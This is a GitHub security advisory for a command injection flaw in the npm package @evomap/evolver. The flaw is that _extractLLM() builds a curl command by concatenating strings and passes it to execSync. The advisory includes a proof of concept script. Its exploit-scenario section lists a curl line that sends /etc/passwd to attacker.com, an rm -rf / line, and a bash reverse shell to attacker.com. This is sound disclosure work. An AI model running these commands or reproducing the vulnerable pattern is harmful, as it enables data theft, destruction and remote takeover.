# [C] Evolver: Command Injection via `execSync` in `_extractLLM()` function allows Remote Code Execution

## Summary
Severity: Critical
Advisory: GHSA-j5w5-568x-rq53
CVE: CVE-2026-42076
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-j5w5-568x-rq53
Type: github-advisory

## Affected
- npm: `@evomap/evolver` — affected >=0 <1.69.3

## Details
### Summary
A command injection vulnerability in the `_extractLLM()` function allows attackers to execute arbitrary shell commands on the server. The function constructs a curl command using string concatenation and passes it to `execSync()` without proper sanitization, enabling remote code execution when the `corpus` parameter contains shell metacharacters.

### Details
The vulnerability exists in `src/gep/signals.js` at lines 260-274:

```javascript
// src/gep/signals.js:260-274
function _extractLLM(corpus, nodeSecret, hubUrl) {
  // ...
  var url = getHubUrl(hubUrl) + '/gep/extract';
  var postData = JSON.stringify({ corpus_summary: summary });
  
  // VULNERABLE: String concatenation into shell command
  var curlCmd = 'curl -s -m 10 -X POST'
    + ' -H "Content-Type: application/json"'
    + ' -H "Authorization: Bearer ' + nodeSecret + '"'
    + ' -d ' + JSON.stringify(postData).replace(/'/g, "'\\''")
    + ' ' + JSON.stringify(url);

  // VULNERABLE: Executes shell command
  stdout = execSync(curlCmd, { timeout: 12000, encoding: 'utf8' });
  // ...
}
```

The `corpus` parameter is derived from user input (via `userSnippet` in `extractSignals()` function) and flows through to `_extractLLM()` where it becomes part of the shell command. While `JSON.stringify()` escapes some characters, it does not prevent shell command substitution via `$(...)` syntax when the resulting string is passed to `execSync()`.

The `extractSignals()` function is called from the main evolution loop in `src/gep/evolver.js`, which processes user snippets and session transcripts.

### PoC

**Prerequisites:**
- Node.js installed
- Access to the evolver application

**Steps to reproduce:**

1. Create a test file that simulates the vulnerable code path:

```javascript
// test-command-injection.js
const { execSync } = require('child_process');

// Simulate the vulnerable _extractLLM function
function vulnerableExtractLLM(corpus) {
  const postData = JSON.stringify({ corpus_summary: corpus });
  const curlCmd = 'curl -s -m 10 -X POST'
    + ' -H "Content-Type: application/json"'
    + ' -d ' + JSON.stringify(postData).replace(/'/g, "'\\''")
    + ' http://localhost/test';
  
  console.log('Command that would be executed:');
  console.log(curlCmd);
  console.log('\n--- Testing command substitution ---');
  
  // Demonstrate that command substitution works
  const testCmd = 'echo ' + JSON.stringify('$(id)');
  console.log('\nTest with echo:');
  console.log(execSync(testCmd, { encoding: 'utf8' }));
}

// Payload with command injection
const maliciousCorpus = '$(touch /tmp/pwned)';
vulnerableExtractLLM(maliciousCorpus);
```

2. Run the test:
```bash
node test-command-injection.js
```

**Expected result:** The command substitution `$(id)` is executed by the shell, demonstrating that the same technique could be used with `curl` to execute arbitrary commands.

**Actual exploit scenario:**
If an attacker can control the `userSnippet` parameter that flows into `extractSignals()` (e.g., via compromised log files or malicious user input), they can inject shell commands like:
- `$(curl attacker.com/exfil?data=$(cat /etc/passwd))`
- `$(rm -rf /)`
- `$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)`

### Impact
This is a **Remote Code Execution (RCE)** vulnerability. An attacker who can control input to the `extractSignals()` function (whether through compromised log files, malicious user input, or other vectors) can execute arbitrary shell commands with the privileges of the Node.js process. This could lead to:
- Full system compromise
- Data exfiltration
- Installation of malware/backdoors
- Lateral movement within the network

**Affected users:** Anyone running the evolver with the GEP (Genetic Evolution Protocol) enabled and processing user-provided content.

## References
- https://github.com/EvoMap/evolver/security/advisories/GHSA-j5w5-568x-rq53
- https://nvd.nist.gov/vuln/detail/CVE-2026-42076
- https://github.com/EvoMap/evolver
- https://github.com/EvoMap/evolver/releases/tag/v1.69.3
